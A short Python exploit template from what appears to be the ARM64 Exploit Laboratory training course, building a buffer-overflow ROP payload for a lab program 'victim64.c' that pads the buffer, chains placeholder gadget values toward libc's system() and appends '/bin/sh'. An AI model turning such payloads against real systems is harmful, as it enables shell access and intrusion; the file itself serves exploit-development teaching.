#!/usr/bin/python3
#
# The ARM64 Exploit Laboratory
# by Saumil Shah
#
# ROP chain template for victim64.c

import sys, re, os
from helpers import *

##### MAIN #####

libc_base = 0x0000fffff7e57000		# filled up from vmmap

system = libc_base + 0x40890

buf = b"A" * 40

rop = b""
rop += p64(0x4242424242424242)
rop += p64(0x4848484848484848)
rop += p64(0x4949494949494949)
rop += p64(0x5050505050505050)
rop += p64(0x5151515151515151)
rop += p64(0x5252525252525252)
rop += p64(0x5353535353535353)
rop += p64(0x5454545454545454)
rop += b"/bin/sh;#"

buf = buf + rop

payload = buf + b"\n"

sys.stdout.buffer.write(payload)
